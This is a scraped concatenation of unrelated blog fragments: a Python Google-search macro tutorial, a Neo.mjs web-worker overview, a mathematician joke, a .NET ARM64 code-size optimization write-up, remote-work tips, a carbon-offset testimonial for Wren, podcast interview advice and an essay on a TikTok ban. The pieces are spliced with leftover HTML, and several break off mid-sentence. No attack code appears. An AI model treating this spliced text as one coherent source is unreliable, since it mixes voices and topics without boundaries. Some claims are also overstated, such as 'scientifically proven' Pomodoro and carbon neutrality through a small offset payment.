<p>I read from the macro file using <a href="https://docs.python.org/3/library/pathlib.html#pathlib.Path.read_text">pathlib.Path.read_text</a> and <a href="https://docs.python.org/3/library/re.html#re.finditer">re.finditer</a>.
I use a regular expression to extract the macros from the macro file, and I use
<a href="https://docs.python.org/3/library/stdtypes.html#str.strip">str.strip</a> to remove excess whitespace from the macros.</p>
<p>I use <a href="https://docs.python.org/3/library/stdtypes.html#str.format_map">str.format_map</a> to perform the macro substitutions.</p>
<p>Instead of performing substitutions until I hit a <a href="https://en.wikipedia.org/wiki/Fixed_point_(mathematics)">fixed point</a>, I perform a
finite number of substitutions.
(This is the constant <code>MAX_MACRO_SUBSTITIONS</code>.)
I do this because it is an easy way to prevent unbounded <a href="https://en.wikipedia.org/wiki/Recursion">recursion</a>, and, in
practice, my macros are not complex enough to cause this strategy to fail.</p>
<p>A macro substitution will fail if I reference a macro that doesn't exist, e.g.
<code>{xyxhkj}</code>.
I handle this by using the context manager <a href="https://docs.python.org/3/library/contextlib.html#contextlib.suppress">contextlib.suppress</a>.
This allows me to catch the relevant exception and stop performing
substitutions, without terminating the whole program.</p>
<p>I build the URL by combining a constant prefix,
<code>https://www.google.com/search?q=</code>, with the query string.
I use <a href="https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote_plus">urllib.parse.quote_plus</a> to properly escape the query string. E.g.</p>
<blockquote>
<pre><code>import urllib.parse
query = "site:news.ycombinator.com haskell"
print(query)
</code></pre>
</blockquote>
<pre><code>site:news.ycombinator.com haskell
</code></pre>
<blockquote>
<pre><code>print(urllib.parse.quote_plus(query))
</code></pre>
</blockquote>
<pre><code>site%3Anews.ycombinator.com+haskell
</code></pre>

<p>In this week's post, you learned how to build a command line tool that helps
you search Google.
You learned how to use the <a href="https://docs.python.org/3/library/pathlib.html">pathlib</a> and <a href="https://docs.python.org/3/library/re.html">re</a> modules to parse the macros.
And you used the <a href="https://docs.python.org/3/library/urllib.parse.html">urllib.parse</a> module to properly construct the URL.</p>
<p>My challenge to you:</p>
<blockquote>
<p>Read about the different Google search operators. (<a href="https://support.google.com/websearch/answer/2466433?hl=en">"Refine web searches" via
google.com</a>.)</p>
<p>Create a few macros that would be useful to you. Some ideas:</p>
<ul>
<li>Create a macro that restricts searches to <a href="https://www.ruby-lang.org/en/">ruby-lang.org</a>.</li>
<li>Create a macro that searches for upcoming <a href="https://en.wikipedia.org/wiki/5K_run">5K races</a> in a specified city.</li>
<li>CreateÂ&nbsp;a macro that searches a person's name, but excludes results from
<a href="https://www.linkedin.com/">LinkedIn</a> and <a href="https://twitter.com/">Twitter</a>.</li>
</ul>

Install Node.js, download one of the many starter packs for React, Angular, Vue or vanilla HTML/JS and kick-start your coding. Building a performant, scalable web application was never easier. Beginners and seasoned developers alike also have a vast repository of libraries available. Thanks to tools like NPM, many hours of coding can be skipped if desired by just installing the components you need.</p><p>With the advent of <strong>PWAs</strong> (progressive web apps), the future looks brighter than ever for full-fledged apps, directly available in every browser. Yet one major architectural aspect is still taming the frontend development: Every app runs its business logic + rendering&nbsp; in a single process, the main thread, by default. As a reminder, the main thread is bound to the&nbsp; browser window, which in all current browsers translated to a window tab.</p><h2>What even is a multithreaded web app</h2><p>Thanks to great advancements lately, developers can now implement multithreading in their apps. Using <strong>Web Workers</strong>, tasks can be run in its isolated threads. Data gets serialized/deserialized before/after being sent between the main thread and a worker. Each web worker is truly running its own process and only bound to the main thread by the app’s lifecycle, that is if the application gets closed, so do all workers.</p><h2>Enter Neo.mjs</h2><p><strong>Neo.mjs</strong> aims at building on this foundation and enhancing it. Out of the box, Neo uses a whopping four threads, as described in the documentation:</p><ul><li><strong>Main</strong>: Creating the workers, manipulating the real DOM, forwarding UI events to App</li><li><strong>App</strong>: Most parts of the framework &amp; your apps live here</li><li><strong>Data</strong>: Responsible for the BE connections</li><li><strong>Vdom</strong>: Converting the virtual DOM into HTML, as well as calculating delta updates</li></ul><p>Here’s a visual representation by the framework’s creators:</p><p>The main goal of Neo is to reduce main’s work as much as possible and delegating computationally intensive tasks to the workers, thus guaranteeing not only a UI without stuttering or lags, but also no overhead for each process, as every worker has its specific role.</p><p>The crazy concept to achieve this goal: also create the vDOM in a worker and only send the “real” rendering to the main thread. If you haven’t heard of it yet, modern UI frameworks such as React don’t render every change you make to your views immediately. They first update a virtual DOM (“vDOM”) and only apply the necessary changes to the real DOM, thus enabling quite a good performance.</p><h2>Keep watching</h2><p>If you’re now curious, check out the links below and test the project for yourself, which is under active and busy development. Mind that it’s still in its early stages and not production-ready. The concept is quite intriguing and promises to be a major architectural design change, for the better.</p><p>- Tom</p><p>👉 <a href="https://github.com/neomjs/neo">Neo.mjs repo</a></p><p>👉 <a href="https://github.com/neomjs/neo/blob/dev/.github/CONCEPT.md">Neo's concept, by its creators</a></p><p>👉 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API">MDN Web Worker</a></p><p>👉 <a href="https://reactjs.org/docs/faq-internals.html">vDOM, as described by the React-team</a></p></div></div></div></div></div></div></div></section></div></div>]]>

The mathematicians were in a tizzy and stared, puzzled, at the tanks. Their collective brainpower, fine for discerning the latest wrinkles in infinite graph theory, was stalling out on the case of the true Joe.</i></p><p><i>Finally a lightbulb went off in the head of a jovial, beer-bellied fellow in a JOY OF SETS T-shirt. He stepped forward and filled his Styrofoam cup, half from one tank and half from the other.&nbsp;</i></p><p><i>"I see," laughed one of his compatriots, "the game-theoretic solution!"</i></p><p><i>"I have another solution," said a thin man whose hands trembled slightly, apparently from a caffeine high. He&nbsp;</i><i>filled his cup a quarter full from one of the tanks.&nbsp;</i><i>"This is the asymptotic solution," he announced. "I'm already so wired I only want a little bit more; whatever is in the cup, I win."</i></p><p><i>A bystander who was a physicist rather than a mathematician didn't understand the need for all this sophisticated thinking. He pointed out that one tank was bigger than the other, and that the bigger tank presumably held caffeinated coffee since more people drink it than drink decaf. &nbsp;The mathematicians were taken aback by the simplicity of the solution. "Our different approaches," said the physicist, "remind me of an old joke. A physicist and a mathematician are flying cross-country together. Each is keeping a diary of the trip. They fly over a white horse in Iowa. The physicist writes, 'There is a white horse in Iowa.' The mathematician writes, 'There exists, somewhere in the Midwest, a horse, white on top.'"</i></p><p>For all that has been written about the difference between physicists and mathematicians, especially with the goal of illuminating their inner minds, this passage provides both a reasonable illustration and a good laugh.</p><p><b><a href="http://twitter.com/philliplevin"> Did you enjoy this?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>This is the 4th of the blog posts series that talks about ARM64 performance investigation for .NET core. You can read previous blogs at:</p>
<ul>
  <li><a href="https://kunalspathak.github.io/2020-06-30-Dotnet-Arm64-Performance">Part 1 - ARM64 performance of .Net Core</a>.</li>
  <li><a href="https://kunalspathak.github.io/2020-07-02-ARM64-Memory-Barriers">Part 2 - Memory barriers in ARM64</a>.</li>
  <li><a href="https://kunalspathak.github.io/2020-07-05-ARM64-peephole-optimizations">Part 3 - Peephole optimizations in ARM64</a>.</li>
</ul>

<p>In this post, I will describe an important optimization opportunity that I could find while doing the performance investigation that led us to get almost <strong>12%</strong> code size improvement.</p>

<h3 id="crossgen">Crossgen</h3>

<p>For those who are not familiar with <a href="https://github.com/dotnet/coreclr/blob/master/Documentation/building/crossgen.md">crossgen tool</a>, let me give a brief background. When you compile your .NET code (C#/F#/VB), a binary containing MSIL (Microsoft Intermediate Language) in the form of <code>.exe</code> or <code>.dll</code> is produced. When you execute such binary, MSIL is converted to machine code by JIT compiler. The advantage of this approach is that you can port the produced binary to any OS platform or architecture i.e. you build a binary on your Windows machine and ship it to a customer running on Ubuntu. But there is a cost of JIT compiling the MSIL into machine code which becomes bottleneck for some apps that need faster startup time. Alternatively, you can precompile your binaries to generate machine code targeting a specific platform or architecture. Such binaries now contain machine code and when executed does not trigger JIT compiler immediately. Startup time for such binaries is now faster and some .NET developers prefer this approach. The code produced by <code>crossgen</code> have slight difference than the ones produced by JIT compiler (although RyuJIT engine is the one that produced target code in both cases). For e.g. with  <code>crossgen</code>, in addition to having the code produced by JIT, it also includes code that make sure that during runtime, it can find the addresses of different types of method calls like delegate, direct method calls, virtual method calls, methods with generic parameters, etc.</p>

<h3 id="adrp-and-add-instructions">adrp and add instructions</h3>

<p>As mentioned in my <a href="https://kunalspathak.github.io/2020-07-04-Dotnet-Arm64-Performance">previous blog post</a>, the performance investigation strategy that I followed was to inspect lot of ARM64 code and compare it against x64. I did this analysis on the code that was produced by <code>crossgen</code> tool.
One thing that I noticed since beginning was that the code size generated for ARM64 was much bigger than that of x64. I will cover on what contributed to bigger ARM64 code size in a separate blog post. But I started investigating the benchmarks and framework library APIs whose code size is magnitude bigger on ARM64. The common pattern that was present multiple times in almost all the methods looked something like this:</p>

<figure><pre><code data-lang="asm"><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre>        9000000B          adrp    x11, [RELOC #0x20a0e212c50]
        9100016B          add     x11, x11, #0
        90000004          adrp    x4, [RELOC #0x20a0e212c50]
        91000084          add     x4, x4, #0
        F9400084          ldr     x4, [x4]
        D63F0080          blr     x4
</pre></td></tr></tbody></table></code></pre></figure>

<p>It was not obvious what this code is doing. <a href="https://developer.arm.com/documentation/dui0802/b/A64-General-Instructions/ADRP">ARM64 manual</a> says that [ADRP] is a relative address from current instruction that is to be loaded in a destination register. On doing research, it turns out that .NET has its own calling covention to invoke methods during runtime. It introduces a layer called “stub” between caller and callee. Imagine “stub” as a table that containing entries to each callee. Caller jumps to the relevant entry of this “stub” table corresponding to the caller it wants to call. When binaries are compiled, the address of callee code is not known. But during runtime, when the caller invokes any method, .NET lazily evaluates the address of that method (callee code) and patch the “stub” entries with the correct address in process memory where the callee code is located. After patching, stub just forwards the calls from caller to actual method code. If you are interested in knowing more, there is a great article about <a href="https://mattwarren.org/2019/09/26/Stubs-in-the-.NET-Runtime/">stubs in .NET runtime</a> that you can read.</p>

<p>.NET’s calling convention for ARM64 is that a fixed register <code>x11</code> should hold an address of “indirect cell” that contains stub code. Since the range specified in <code>adrp</code> can only address +/-4KB page, the upper 12-bits address is encoded in this instruction. The lower bits are specified in <code>add</code> instruction to redirect to an indirect cell that is farther than 4KB from current instruction. Thus, the combination of <code>adrp+add</code> points to the final indirect cell address of the call site. That explains why the <code>adrp+add</code> pattern was so common and was present in almost all methods.</p>

<h3 id="redundant-adrp-and-add-instructions">Redundant adrp and add instructions</h3>

<p>In the above assembly code, you will notice that we try to load an indirect cell address <code>0x20a0e212c50</code> in <code>x11</code>. We again try to load same address in <code>x4</code>, get the indirection present at that address using <code>ldr x4, [x4]</code> (load the value present at address in <code>x4</code> and save it in <code>x4</code>) and make a jump to the stub code using <code>blr x4</code>. If we already have the address in <code>x11</code>, there is no need to re-populate that address inside <code>x4</code>. On the contrary, if we never use the indirection from <code>x11</code>, we should not bother storing the cell address in <code>x11</code>. But as mentioned above, .NET calling convention requires the indirect cell address to be present inside <code>x11</code>, we cannot omit that for sure. Hence, we should remove the redundant instructions that loads the address in <code>x4</code> and instead load the indirection from <code>x11</code> into <code>x4</code>. In short, we wanted our code to like this:</p>

<figure><pre><code data-lang="asm"><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>        9000000B          adrp    x11, [RELOC #0x20a0e212c50]
        9100016B          add     x11, x11, #0
        F9400084          ldr     x4, [x11]
        D63F0080          blr     x4
</pre></td></tr></tbody></table></code></pre></figure>

<p>ARM64 follows fixed encoding i.e. each instruction has fixed size of 4-bytes. If we can do the above described optimization, that would give us an improvement of 8-bytes per call site. Before I started working on it, I wrote a small utility in <a href="https://github.com/dotnet/jitutils/blob/a8343a8df3ffa88753cb20f0115154c69da11e23/src/AnalyzeAsm/Program.cs#L1503">AnalyzeAsm</a> to scan the ARM64 code produced for .NET framework libraries by <code>crossgen</code> and get an estimate of number of occurrences of such redundant <code>adrp+add</code> occurrences. I was surprised to see that there were around <strong>615732</strong> such groups in <strong>126823</strong> methods. That is approximately <strong>4.9MB</strong> of code size and was worth pursuing it.</p>

<h3 id="result">Result</h3>

<p>With <a href="https://github.com/dotnet/runtime/pull/35675">part 1</a> and <a href="https://github.com/dotnet/runtime/pull/36817">part 2</a> of this work, we were able to improve the code size of .NET framework libraries by over <strong>13.5%</strong> which was very significant.</p>

<h3 id="addressing-a-bug">Addressing a bug</h3>

<p>While the benefits were great, there was also painful stretch of couple of days debugging an odd bug that got introduced by my change. There was an AccessViolation (AV) happening in <code>ConditionalWeakTableTest</code> test around <a href="https://github.com/dotnet/runtime/blob/9ccfc40ec9db8bbc9806e8d4fce71b27eb442503/src/libraries/System.Runtime/tests/System/Runtime/CompilerServices/ConditionalWeakTableTests.cs#L486">this line</a>. Since this was the only one test failing out of 1000+ test that we run, it was hard to believe that it has anything to do with my performance optimization work. But the failure was consistent on subsequent reruns and was only on ARM64 which made it clear that it is something to do with my changes. The challenging part was to figure out why it was crashing. For that, I had to first find out where in the machine code (and corresponding to what part of C# code) we were accessing bad memory. This involved lot of stepping through the machine code. Once I found out that, I had to do <code>diff</code> of the generated JIT code for the method before and after my changes to see what was different.</p>

<p><img src="https://kunalspathak.github.io/assets/img/adrp_add/bug.png"></p>

<p>From the difference, it was clear that there was a scenario (related to tail-calls) that should not be optimized but it was still getting optimized. During JIT, before my change, we were populating the indirect cell address inside <code>xip0</code> register and then jumping to it, but my change was optimizing the population of cell address inside <code>xip0</code>. Hence, we were jumping to an invalid memory location present inside <code>xip0</code>. The fix was simpler than the debugging.</p>

<p>Namaste!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Tips for when the novelty of remote working wears off</span></p></div><div><p>Many of us have unexpectedly found ourselves remote working this year. At first, it seemed like a dream - no more commute! No more tedious office politics! An extra hour in bed in the morning! But now that we've all been working away in our spare rooms and on our sofas for weeks on end the novelty is beginning to wear off.</p>
<p>Here are some of the downsides to remote working, and tips for how to overcome them…</p>
<h2>It's impossible to focus</h2>
<p>When you're working in isolation it can be really hard to keep your mind from wandering. Whether it's taking a minute to load the dishwasher, feed the cat or plan your weekend it's all too easy for those five minute breaks to become half an hour of mindless scrolling on TikTok.</p>
<p>It's a fine balance between keeping on task, and allowing your mind a bit of breathing room - after all in the buzz and noise of an office you'd likely face micro distractions all day.</p>
<p>A great way to keep yourself motivated, productive and focussed is to try the <a href="https://en.wikipedia.org/wiki/Pomodoro_Technique" target="_blank" rel="noreferrer">Pomodoro Method</a>. It's a scientifically proven technique where you knuckle down and work in 25 minute bursts, followed by timed five minute breaks to refresh your mind. There are great <a href="https://tomato-timer.com/" target="_blank" rel="noreferrer">Pomodoro apps</a> available so that you can time it on your phone, or even on your <a href="https://gallery.fitbit.com/details/fa42ebf3-10ec-4b0e-8dbb-2e36d4020f0a" target="_blank" rel="noreferrer">Fitbit</a>!</p>
<h2>It can be lonely</h2>
<p>If you're used to going into an office every day it's a big adjustment to miss out on the team culture. All those water cooler moments, team meetings and coffee breaks really help to top up your mind's need for social interaction. You might have found Greg from accounts seriously annoying with his constant holiday stories, but now that you don't speak to him (or anybody else) for hours on end you strangely find yourself wondering if he ever got to go to Cancun?</p>
<p>Teams using Slack can help their members to keep social interaction going by using tools such as <a href="https://aboutsnack.com/" target="_blank" rel="noreferrer">Snack</a>, which enables spontaneous video chats between colleagues, with ice breaker questions and timers to keep it fun and brief.</p>
<h2>Work/life balance becomes a blur</h2>
<p>You've always wanted more 'life' in your work/life balance, but now that work is in your home, and you only have to walk a few steps from your bed to your desk, it all seems a bit too close for comfort.</p>
<p>The ideal situation is of course to have a home office that you can close the door on at the end of the day, but if that's not possible, consider solutions such as a Murphy desk that you can close up when you clock off so that your work space isn't staring you in the face as you try to relax.</p>
<h2>Creativity can dry up</h2>
<p>When you are sitting in the same environment day in day out, without the stimulation of your team around you, it can be hard to keep coming up with fresh new ideas. When you find yourself hitting the brick wall, take some time to see what the competition are up to. Also have a look at your customers, see what they're talking about on social media, or how they are adapting to current circumstances. By bringing the outside into your day you can create serendipity by stumbling across something that inspires your next brilliant project. Sometimes you have to get out of your zone and create your own lightbulb moment!</p>
<h2>Unexpected video calls</h2>
<p>There's no getting around this one. Just make sure you at least change out of your pyjamas each day!</p></div></div>]]>

<p>Last Friday, my carbon footprint dropped from 7 tons per year to 0. That is like saving 6 trees or over 200 square feet of Arctic ice every year.</p>



<p>For those who are not familiar with the terminology, that is okay. I was like you not too long ago. A person’s carbon footprint is the amount of carbon dioxide produced directly or indirectly in support of the life that person leads. When a person has a carbon footprint of zero, that means they are carbon neutral. In other words, it means that their impact on Earth’s atmosphere is zero. It is neutral.</p>



<p>It took me a few years to get my carbon footprint down to 7 tons per year in the first place. It used to be closer to the American average of 19.5. We are lucky that what is good for Earth is often good for us too. I started doing things that were good for Earth and good for me, mostly because they were good for me. I did not know much about the climate crisis back then.</p>



<p>I walked to work. I kept my electric bill down. I tried to buy things less often and more locally. I lived in <a href="https://blogofjake.com/2020/04/17/minimalism/">minimalist </a>apartments in San Francisco and New York. I even started <a href="https://blogofjake.com/2020/01/21/the-gluten-free-vegan-diet-intermittent-fasting-and-green-smoothies/">eating vegan </a>during the week. These choices made me healthier and happier while lowering my carbon footprint. Still, they did not make me carbon neutral. I did not think that was possible.</p>



<p>Then I found <a href="https://projectwren.com/">Wren</a>.</p>



<p>Wren made it look easy to go carbon neutral. It quickly turned out to be even easier than it looked.</p>



<p>Wren helped me calculate my carbon footprint with some simple questions. Then it showed me how much I could contribute on a monthly basis to any of a few trustworthy projects that would offset my carbon footprint to zero. I chose to support a <a href="https://projectwren.com/projects/community-tree-planting">community tree planting project</a> in East Africa. Like all the other things that are good for Earth and good for us, the tree planting project is good for Earth and good for the people involved. I committed less than $6 per month. That was the moment I became carbon neutral.</p>



<p>Some people say the climate crisis is too large a problem for any individual to make a difference. Those people must not have read about The Civil Rights Movement. They must have missed the #MeToo Movement too. They must not know Greta Thunberg, the 17-year-old environmental activist from Sweden who stood up to the leaders of the world and last year became the youngest ever&nbsp;<em>Time Person of the Year</em>.</p>



<p>We cannot all be the next Greta Thunberg, but we can all join the global movement to end the climate crisis. We can all do things that are better for Earth and better for us. We can all become climate neutral as individuals, and then as humanity. We can all help save Earth.</p>



<p>I recommend going to <a href="https://projectwren.com/">projectwren.com</a> to get started.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<p>If you’ve ever seen a Larry King interview, you’ve probably noticed how he doesn’t interrupt his guests. His unique ability to NOT interrupt his guests is what made him such a great interviewer. But I’ve never seen anyone else copy his style. Instead, they all interrupt their guests, just like everyone else.</p>
<p>Why is this? Why do so many interviewers feel compelled to interrupt? I believe it’s because we’ve all been misled to believe that the person who speaks the most is the person who has the most power.</p>
<p>But if you’re talking more, you’re thinking less. And if you’re thinking less, you’re learning less.</p>
<p>Interrupting your guests is a terrible habit. It’s the equivalent of “thinking out loud” and it destroys your ability to listen and learn. Fortunately, you can overcome this bad habit. Here’s how.</p>
<p><strong>1. Don’t “perform for the audience”</strong><br>When you are interviewing someone, you are seemingly having a conversation. But you are also constantly thinking about the audience and worrying about being entertaining and keeping them engaged. You can’t be both at the same time. You can only be one or the other. If you try to be both, you’ll fail at both.</p>
<p>You have to be 100% present in the conversation with your guest. And you have to focus on what they are saying and what they are thinking. If you are focused on being entertaining, you’ll miss the important insights that your guest has to share.</p>
<p>The only way to get out of this habit is to simply make a decision. Decide that you will be 100% present in the conversation with your guest. That you will be fully engaged and listening to them. A great, healthy conversation will automatically become more entertaining and insightful.</p>
<p><strong>2. Relax</strong><br>If you’re not having fun, your audience isn’t having fun. And if your audience isn’t having fun, they will leave. If you have just started as a podcaster, it’s natural to want to <em>make the best possible show that you can</em>. But if you take that attitude into your interviews, you’ll end up pushing too hard. And that will lead to bad results.</p>
<p>There is no perfect interview. Every interview will have its flaws. But if you relax and don’t worry about it, you’ll be able to create an easy atmosphere that will make your guest more comfortable. And that will allow you to have a better conversation. If you are nervous or jittery, your guest will feel that. And it will cause them to be nervous and jittery too.</p>
<p><strong>3. Don’t prepare questions in advance</strong><br>It’s tempting to prepare your questions in advance. But I strongly recommend that you don’t. Your questions should always be a product of the conversation. If you’re trying to figure out what to ask next, it will show. You won’t be listening. And you won’t be able to have a great conversation.</p>
<p>The best interviews are always conversations. They aren’t interrogations and they aren’t performances. And the best way to have a conversation is to not prepare in advance. Think of the greatest conversations you’ve ever had. They might have been with your friends or family or colleagues. Or with a random stranger at a party. Did you prepare for those conversations? Or did they flow organically?</p>
<p><strong>4. Mine those stories</strong><br>Everyone loves a great story. Allow your guests to tell their stories. Be the sidekick. Be the wingman. Set them up. And let them tell their stories. It’s the best way to get them to open up and make your show interesting.</p>
<p>Look out for great stories. Let’s say you have a startup founder on your show and while talking about how he raised funding he casually mentions how the day before an important meeting he ate forty mangoes to get over a stomach virus. That’s a great story! Don’t just move on. Pause. Comment on the story. Prod him to tell you more. He’ll be happy to oblige. When you are having fun your audience will have fun too.</p>
<p><strong>5. Remember the first rule of improv: Say “yes, and…”</strong><br>You have to be a good improviser to be a great interviewer. It’s about being in the moment and reacting to the flow of the conversation.</p>
<p>Don’t steer the conversation in a particular direction. Instead, go with the flow of the conversation. You don’t have to lead it. It will lead itself. If you start to worry about where the conversation is going, you’ll start to think about it. And that will kill the conversation. Like Bruce Lee said, “Don’t think, feel.” This is tied in with rule 3 – don’t prepare. If you prepare questions in advance you’ll try to steer the conversation in the direction of those questions.</p>
<p>Instead, be in the moment. React to the flow of the conversation. Like a surfer riding a wave, you don’t control the wave. You react to it. You go with it.</p>
<p><strong>6. Be genuine</strong><br>Your guests can sense when you’re faking it. If you’re trying to be someone you’re not, your guests will feel it. If you’re not having fun, they won’t have fun. If you’re not interested in them, they won’t be interested in you.</p>
<p>Be honest. Be humble. If your guest mentions something that you don’t know about, don’t pretend that you do. If an idea seems confusing, say that it seems confusing. Don’t pretend that you know more than you do. You’ll come across as arrogant. Instead, ask the guest to teach you. You’ll learn more and your guest will appreciate your honesty.</p>
<p><strong>7. Ask smart questions</strong><br>If you ask questions that can be answered with a simple “yes” or “no” you’ll kill the conversation. If you ask a question like “Do you think it’s a good idea to eat raw fish?” the interview will be over in two seconds. Instead, ask open-ended questions. Questions that can’t be answered with a simple “yes” or “no.” Like, “What are the pros and cons of eating raw fish?” or “What would you say to someone afraid to eat sushi?”</p>
<p>These types of questions will make your guests think. They’ll open up and have more to say. And the conversation will be better for it.</p>
<p>“What” questions are usually boring and lead to boring answers. Instead, ask “Why” questions. Questions like “Why did you do that?” or “Why did you start that company?” These types of questions lead to interesting answers. They are much more fun.</p>
<p>“What” questions are usually about facts. And facts are boring. For example, “What is your company’s vision?”. Ask “How did you come up with the vision for your company?”</p>
<p>Another mistake is to ask questions that “lead the witness”. For example, “Don’t you think…”. These questions put your guest on the defensive and make them want to argue with you.</p>
<p>So there you have it. The most important thing is to listen to your guest. When you listen, the rest will follow. You’ll ask the right questions. You’ll get the most out of the conversation. And you’ll make a great podcast.</p><div>

		<p>While I often say that I don’t respond to recent business news here, I have also recently broken that rule a few times. So I decided to look at the potential Tiktok ban in the US. To connect this potential ban to my other writing I’ll go back to Merton’s five causes of unintended consequences to point out some less discussed reasons for why the ban might be good or bad.</p>
<p>Related to the discussion around Tiktok, I was reminded that this week marks the 30th year since I first visited mainland China. I remember this because I was in Beijing at the same time that Saddam Hussein’s Iraq invaded Kuwait — the first week of August 1990. The hotel TV did not black out that specific part of the news.</p>
<p>Since that time I went to mainland China perhaps around 50 times both for work and to travel. For a large country with big regional differences, I don’t count 50 trips as a lot. But I’ve found my perspective to be different from that of others who spent more time there simply because I have seen the country over a longer time.</p>
<p>While it’s now been two years since I have been to China, also for work, a lot of my experience was of a China that doesn’t really exist anymore. Many of my trips to the country were in the 1990s and early 2000s. First off, that was a cash society and not the mobile payments-driven one of today. On longer trips, I had several occurrences where I needed to coax bank employees through a long process of filling out long handwritten forms so that I could make an international withdrawal. Today’s China of mobile payments (and monitoring) is one that I haven’t experienced that much personally. For example, in a previous <a href="https://unintendedconsequenc.es/a-second-step/">article</a> I used a picture of stacks of bike share bikes which were plentiful, but not accessible to me because I didn’t have a bank account linked to the relevant app.</p>
<p>Many of my trips in China were also before smart phones were common. It did not hinder anything about my experiences there, it just made them different than they would be today.</p>
<div dir="auto">
<p>In a way connected to the previous two, another experience I had in China was that a lot of my trips were during a period of growing freedom. I did many things that are probably unusual or impossible today, including making friends with <a href="https://unintendedconsequenc.es/uyghurs-xinjiang-onward-to-the-inevitable/">Uyghurs in Xinjiang</a>, seeing multiple arrests (related to <a href="https://unintendedconsequenc.es/very-different-funeral-deng-xiaoping/">Deng Xiaoping’s funeral</a> and Falun Gong), having thoughtful discussions with people I met on China’s development, the US, Taiwan, and other topics.</p>
<p>But back to Tiktok, a popular short video app that is an American company owned by ByteDance, a Chinese parent company. Tiktok’s corporate behavior and the history of non-reciprocity of tech in China is problematic. Does a ban or potential sale to an American company (perhaps Microsoft) make sense?</p>
<p>Others have <a href="https://stratechery.com/2020/the-tiktok-war/">pointed out</a> that an issue with Tiktok is not only that it censors political information unwanted by China’s government, but its algorithmic feed determines what content users see. Tiktok has hundreds of millions of users which means that at scale it can influence what ideas become the norm, whether by suppressing undesirable ones or encouraging users to avoid ones that would lead to their own accounts being suppressed.</p>
<p>And as others have mentioned, Tiktok’s users were responsible for low turnout at Trump’s political rally in Tulsa. How should we look at the potential to ban an app in the US — something that is common to do in China?</p>

<h2>Merton’s List</h2>
<p>Robert Merton’s five causes of unintended consequences are <a href="https://unintendedconsequenc.es/acquiring-ignorance/">ignorance</a>,&nbsp;<a href="https://unintendedconsequenc.es/basic-values/">basic values</a>, <a href="https://unintendedconsequenc.es/long-reach-of-short-term-interests/">short vs long-term interests</a>, the <a href="https://unintendedconsequenc.es/the-self-defeating-prophecy">self-defeating prophecy,</a> and <a href="https://unintendedconsequenc.es/origins-of-error">error</a>. His list is high-level, but it will do for today.</p>
</div>
<p>Let’s take a quick look at each related to Tiktok and why we are in a situation to have this discussion.</p>
<h3>Ignorance</h3>
<p>One of the differences between the US and China is that it is easier to learn about the American side than the Chinese side. The exchange of people is relatively lopsided (more Chinese citizens studying and working in the US than the reverse). American customs are easier to learn. In spite of the above, the China side invests more time to learn about the US than the reverse. This is a fault of interest and expectations on the US side.</p>
<p>As I wrote in my article on <a href="https://unintendedconsequenc.es/acquiring-ignorance/">ignorance</a>, “First-order effects of ignorance include incorrect decisions. Second-order effects include not understanding why the decisions are incorrect.”</p>
<h3>Basic Values</h3>
<p>From the typical American perspective, a grating part of a ban is that “it’s not who we are, it’s just not something we do.” Let users decide where to put their time. After all, if they want to use a well-designed app that has millions of users, but also concerns around security and influence, it’s their choice. The best ideas will win out. The problem with this argument is that most of the past examples of this argument have been domestic products. The US has also been quite critical of (though seldom willing to ban or break up) domestic tech companies that gain too much power.</p>
<p>Should the same be extended to foreign companies, at least those owned by antagonistic countries? Tiktok’s own censorship, <a href="https://www.washingtonpost.com/technology/2019/09/15/tiktoks-beijing-roots-fuel-censorship-suspicion-it-builds-huge-us-audience/">including that of</a> protests in Hong Kong, treatment of Uyghurs in Xinjiang, and even of <a href="https://www.businessinsider.com/tiktok-censorship-users-deemed-ugly-overweight-or-disabled-2020-3">unattractive users</a>, is also contrary to US basic values.</p>
<h3>Short vs Long-Term Interests</h3>
<p>Tiktok’s American management of course came out against the ban. I have no idea what they actually think, though I do remember <a href="https://www.brainyquote.com/quotes/upton_sinclair_138285#:~:text=Upton%20Sinclair%20Quotes&amp;text=It%20is%20difficult%20to%20get%20a%20man%20to%20understand%20something,upon%20his%20not%20understanding%20it.">that</a> “It is difficult to get a man to understand something when his salary depends upon his not understanding it.”</p>
<p>Tiktok claims that it will create 10,000 jobs in the US over the next three years. The company is rallying its users in its defense. Why wouldn’t it?</p>
<p>But this is where the interests of Tiktok (the short-term) don’t match with the interests of the US (the long-term). Yes, banning Tiktok would leave its users without the entertainment (until they find a new app or a workaround). The ban would probably eliminate some jobs. But in the timeline of social media companies, perhaps we shouldn’t care. We rarely mourn for MySpace today, even if it’s decline was for market reasons. Other products will fill Tiktok’s void. Long-term detriments or benefits of its ban may include the slippery slope of banning other apps, opening the way for other countries to ban apps, and more.</p>
<p>Another view on the ban is that it comes up within 100 days of the presidential election. Government timescales in the US are shorter than those in China not because of the different ages of the countries but because the US has elections every four years and the political party in the executive branch often flips, while China has one party and Xi Jinping might last for decades now that he removed term limits.</p>
<h3>The Self-Defeating Prophecy</h3>
<p>I’ll just quote my earlier article on <a href="https://unintendedconsequenc.es/the-self-defeating-prophecy/">this type</a>: “I think of this phenomenon as a tortoise and hare situation. Not the “slow and steady” part, but instead that the unexpected nature of who would win a tortoise-hare race is baked into the participants’ behavior. The hare only stops to rest because it is so obvious that it will win, which in turn becomes the reason it loses.”</p>
<h3>Error</h3>
<p>A common error in American discussions of Tiktok is assumptions about a bilateral nature of its ban. China has banned or blocked many American companies for years now. A partial list of these American companies includes Google, Youtube, Facebook, Wikipedia, Instagram, and Twitter.</p>
<p>It was a mistake to not require reciprocity for the years these companies have been blocked in China. That being said, Tiktok is the first China-owned tech company to gain the consumer mass market in the US.</p>
<p>The explanations for banning US tech companies in China includes both information flow but also the ability for Chinese versions of these products to have a chance. It’s like saying that the US should ban Tiktok so that domestic companies have the ability to build their own short video apps. That’s a concept typically not considered for Americans.</p>
<p>And what happens when the movement is in a different direction? What about Zoom, an American company that has banned user activity in the US at China’s request? Actually, <a href="https://www.reddit.com/r/HongKong/comments/dfg1ce/list_of_companies_under_chinas_censorship_orders/">the list</a> of non-Chinese companies companies complying with pressure from China (to say nothing of those doing so proactively) is quite long.</p>
<p><span>The Opposite Trap</span></p>
<div dir="auto">
